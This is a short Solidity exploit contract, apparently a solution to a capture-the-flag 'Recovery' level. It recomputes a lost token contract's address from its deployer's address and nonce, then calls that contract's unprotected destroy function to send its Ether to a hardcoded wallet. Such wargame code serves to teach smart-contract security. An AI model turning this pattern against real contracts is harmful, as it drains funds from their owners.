// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SimpleToken} from "./Recovery.sol";
import {Recovery} from "./Recovery.sol";

contract RecoveryAttack {

    address payable public lostContract;
    address public recoveryAddress;
    address public myWallet = 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2;

    constructor(address _recoveryAddress) {
        recoveryAddress = _recoveryAddress;
    }

    function computeAddress() public {
        lostContract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), recoveryAddress , bytes1(0x01)))))));
    }

    function attack() public {
        SimpleToken simpleToken = SimpleToken(lostContract);
        simpleToken.destroy(payable(myWallet));
    }
}
